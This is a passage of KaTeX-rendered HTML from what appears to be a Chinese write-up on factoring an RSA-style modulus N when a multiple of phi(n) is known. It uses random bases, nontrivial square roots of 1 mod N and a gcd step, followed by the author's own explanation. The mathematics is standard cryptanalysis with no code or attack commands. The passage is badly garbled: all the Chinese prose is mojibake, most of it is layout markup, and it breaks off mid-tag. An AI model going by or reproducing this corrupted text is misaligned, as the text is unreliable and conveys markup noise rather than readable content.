mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mspace width="1em"/><mi>f</mi><mi>o</mi><mi>r</mi><mspace width="1em"/><mi>s</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mn>1...</mn><mi>u</mi><mi>n</mi><mi>t</mi><mi>i</mi><mi>l</mi><mspace width="1em"/><msub><mi>a</mi><mn>1</mn></msub><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>å½“ç»“æŸåå¦‚æœ</mtext><mi>s</mi><mo>=</mo><mn>0</mn><mtext>åˆ™è¯´æ˜ç®—æ³•å¤±æ•ˆï¼Œä¸€èˆ¬ä¸ºé‡æ–°é€‰å–</mtext><mi>w</mi><mtext>ã€‚</mtext><mspace linebreak="newline"></mspace><mtext>è®¡ç®—</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>â‰¡</mo><msup><mi>w</mi><mrow><msup><mn>2</mn><mrow><mi>s</mi><mo>âˆ’</mo><mn>1</mn></mrow></msup><mo>âˆ—</mo><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>ä¿è¯</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>â‰¡Ì¸</mo><mo>Â±</mo><mn>1</mn><mtext>ï¼Œåˆ™</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>å°±æ˜¯</mtext><mi>N</mi><mtext>çš„ä¸€ä¸ªåˆ†è§£ã€‚</mtext><mspace linebreak="newline"></mspace><mtext>ç”±äºä¸€å¼€å§‹</mtext><mi>N</mi><mtext>ä¸æ­¢æœ‰ä¸¤ä¸ªç´ æ•°ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åˆ¤æ–­ä¸€ä¸‹åˆ†è§£å‡ºæ¥çš„æ˜¯ä¸æ˜¯ç´ æ•°ã€‚</mtext></mrow><annotation encoding="application/x-tex">æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼šk\phi(n)=2^x*gift\\æ¯ä¸€æ¬¡åˆ†è§£æ—¶ï¼šéšæœºå–ä¸€ä¸ªæ•°w\in[2,N-2]\\è®¡ç®—æ•°a_1=w^{2^s*gift}\mod N\quad for\quad s=0,1... until\quad a_1\equiv1\mod N\\å½“ç»“æŸåå¦‚æœs=0åˆ™è¯´æ˜ç®—æ³•å¤±æ•ˆï¼Œä¸€èˆ¬ä¸ºé‡æ–°é€‰å–wã€‚\\è®¡ç®—a_2\equiv w^{2^{s-1}*gift}\mod N\\ä¿è¯a_2\not\equiv\pm1ï¼Œåˆ™gcd(N,a_2+1)å°±æ˜¯Nçš„ä¸€ä¸ªåˆ†è§£ã€‚\\ç”±äºä¸€å¼€å§‹Nä¸æ­¢æœ‰ä¸¤ä¸ªç´ æ•°ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åˆ¤æ–­ä¸€ä¸‹åˆ†è§£å‡ºæ¥çš„æ˜¯ä¸æ˜¯ç´ æ•°ã€‚</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord cjk_fallback">é“</span><span class="mord cjk_fallback">ï¼š</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">æ¯</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">æ¬¡</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">è§£</span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">ï¼š</span><span class="mord cjk_fallback">éš</span><span class="mord cjk_fallback">æœº</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">æ•°</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">âˆˆ</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord cjk_fallback">æ•°</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.92998em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.92998em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385428571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathnormal">u</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">å½“</span><span class="mord cjk_fallback">ç»“</span><span class="mord cjk_fallback">æŸ</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å¦‚</span><span class="mord cjk_fallback">æœ</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord cjk_fallback">åˆ™</span><span class="mord cjk_fallback">è¯´</span><span class="mord cjk_fallback">æ˜</span><span class="mord cjk_fallback">ç®—</span><span class="mord cjk_fallback">æ³•</span><span class="mord cjk_fallback">å¤±</span><span class="mord cjk_fallback">æ•ˆ</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">èˆ¬</span><span class="mord cjk_fallback">ä¸º</span><span class="mord cjk_fallback">é‡</span><span class="mord cjk_fallback">æ–°</span><span class="mord cjk_fallback">é€‰</span><span class="mord cjk_fallback">å–</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">ã€‚</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0369199999999998em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0369199999999998em;"><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mbin mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mbin mtight">âˆ—</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ä¿</span><span class="mord cjk_fallback">è¯</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel">î€ </span></span><span class="fix"></span></span></span></span></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Â±</span><span class="mord">1</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">åˆ™</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">è§£</span><span class="mord cjk_fallback">ã€‚</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">ç”±</span><span class="mord cjk_fallback">äº</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">å¼€</span><span class="mord cjk_fallback">å§‹</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ä¸</span><span class="mord cjk_fallback">æ­¢</span><span class="mord cjk_fallback">æœ‰</span><span class="mord cjk_fallback">ä¸¤</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord cjk_fallback">ç´ </span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æ‰€</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">è¿™</span><span class="mord cjk_fallback">é‡Œ</span><span class="mord cjk_fallback">éœ€</span><span class="mord cjk_fallback">è¦</span><span class="mord cjk_fallback">åˆ¤</span><span class="mord cjk_fallback">æ–­</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">ä¸‹</span><span class="mord cjk_fallback">åˆ†</span><span class="mord cjk_fallback">è§£</span><span class="mord cjk_fallback">å‡º</span><span class="mord cjk_fallback">æ¥</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">ä¸</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">ç´ </span><span class="mord cjk_fallback">æ•°</span><span class="mord cjk_fallback">ã€‚</span></span></span></span></span></p><p>ä¸ªäººç†è§£ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>å½“</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mtext>æ—¶ï¼Œ</mtext><msub><mi>a</mi><mn>1</mn></msub><mtext>å°±æ˜¯æ¨¡</mtext><mi>N</mi><mtext>ä¸‹çš„å¹³å‡¡å¹³æ–¹æ ¹</mtext><mspace linebreak="newline"></mspace><mtext>é€šè¿‡è®¡ç®—æˆ‘ä»¬çŸ¥é“</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>â‰¡</mo><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>å› ä¸º</mtext><mi>N</mi><mtext>æ˜¯åˆæ•°ï¼Œåªè¦</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>â‰¡Ì¸</mo><mo>Â±</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mtext>ï¼Œåˆ™</mtext><msub><mi>a</mi><mn>2</mn></msub><mtext>ç§°ä¸ºæ¨¡</mtext><mi>N</mi><mtext>ä¸‹çš„éå¹³å‡¡å¹³æ–¹æ ¹</mtext><mspace linebreak="newline"></mspace><mtext>ï¼ˆè¿™é‡Œåªéœ€è¦åˆ¤æ–­</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>â‰¡Ì¸</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mo separator="true">,</mo><mtext>å› ä¸ºå‡ºè®¡ç®—</mtext><msub><mi>a</mi><mn>1</mn></msub><mtext>æ—¶å·²ç»è®¡ç®—è¿‡ä¸€é</mtext><msub><mi>a</mi><mn>2</mn></msub><mtext>ä¸ç­‰äº</mtext><mn>1</mn><mtext>äº†</mtext><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>å¾—</mtext><msubsup><mi>a</mi><mn>2</mn><mn>2</mn></msubsup><mo>âˆ’</mo><mn>1</mn><mo>â‰¡</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>â‰¡</mo><mn>0</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>N</mi><mspace linebreak="newline"></mspace><mtext>å¾—</mtext><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>âˆ—</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>2</mn></msub><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>k</mi><mi>N</mi><mtext>ï¼Œå› ä¸º</mtext><mi>N</mi><mtext>ä¸ºåˆæ•°</mtext><mspace linebreak="newline"></mspace><mtext>å¾—</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo>=</mo><mi>x</mi><mtext>æˆ–è€…</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>âˆ’</mo><mn>1</mn><mo>=</mo><mi>x</mi><mtext>ï¼Œè¿™é‡Œ</mtext><mi>x</mi><mtext>æŒ‡</mtext><mi>k</mi><mi>N</mi><mtext>ä¸­çš„ä¸€ä¸ªå› æ•°</mtext><mspace linebreak="newline"></mspace><mtext>é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡æ±‚è§£</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>æˆ–è€…</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>N</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>å°±å¯ä»¥å¾—åˆ°</mtext><mi>N</mi><mtext>çš„åˆ†è§£äº†</mtext><mspace linebreak="newline"></mspace><mtext>ï¼ˆæ‰€ä»¥ç®—æ³•ä¸­</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mtext>ä¸­çš„</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mtext>æ”¹æˆ</mtext><msub><mi>a</mi><mn>2</mn></msub><mo>âˆ’</mo><mn>1</mn><mtext>ä¹Ÿæ˜¯å¯è¡Œçš„ï¼‰</mtext></mrow><annotation encoding="application/x-tex">å½“a_1\equiv1\mod æ—¶ï¼Œa_1å°±æ˜¯æ¨¡Nä¸‹çš„å¹³å‡¡å¹³æ–¹æ ¹\\é€šè¿‡è®¡ç®—æˆ‘ä»¬çŸ¥é“a_1\equiv a_2^2\equiv1\mod N\\å› ä¸ºNæ˜¯åˆæ•°ï¼Œåªè¦a_2\not\equiv\pm1\mod Nï¼Œåˆ™a_2ç§°ä¸ºæ¨¡Nä¸‹çš„éå¹³å‡¡å¹³æ–¹æ ¹\\ï¼ˆè¿™é‡Œåªéœ€è¦åˆ¤æ–­a_2\not\equiv1\mod N,å› ä¸ºå‡ºè®¡ç®—a_1æ—¶å·²ç»è®¡ç®—è¿‡ä¸€éa_2ä¸ç­‰äº1äº†)\\å¾—a_2^2-1\equiv(a_2+1)*(a_2-1)\equiv0\mod N\\å¾—(a_2+1)*(a_2-1)=kNï¼Œå› ä¸ºNä¸ºåˆæ•°\\å¾—a_2+1=xæˆ–è€…a_2-1=xï¼Œè¿™é‡ŒxæŒ‡kNä¸­çš„ä¸€ä¸ªå› æ•°\\é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡æ±‚è§£gcd(N,a_2+1)æˆ–è€…gcd(N,a_2-1)å°±å¯ä»¥å¾—åˆ°Nçš„åˆ†è§£äº†\\ï¼ˆæ‰€ä»¥ç®—æ³•ä¸­gcdä¸­çš„a_2+1æ”¹æˆa_2-1ä¹Ÿæ˜¯å¯è¡Œçš„ï¼‰</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">å½“</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">æ—¶</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">æ¨¡</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ä¸‹</span><span class="mord cjk_fallback">çš„</span><span class="mord cjk_fallback">å¹³</span><span class="mord cjk_fallback">å‡¡</span><span class="mord cjk_fallback">å¹³</span><span class="mord cjk_fallback">æ–¹</span><span class="mord cjk_fallback">æ ¹</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">é€š</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">è®¡</span><span class="mord cjk_fallback">ç®—</span><span class="mord cjk_fallback">æˆ‘</span><span class="mord cjk_fallback">ä»¬</span><span class="mord cjk_fallback">çŸ¥</span><span class="mord cjk_fallback">é“</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 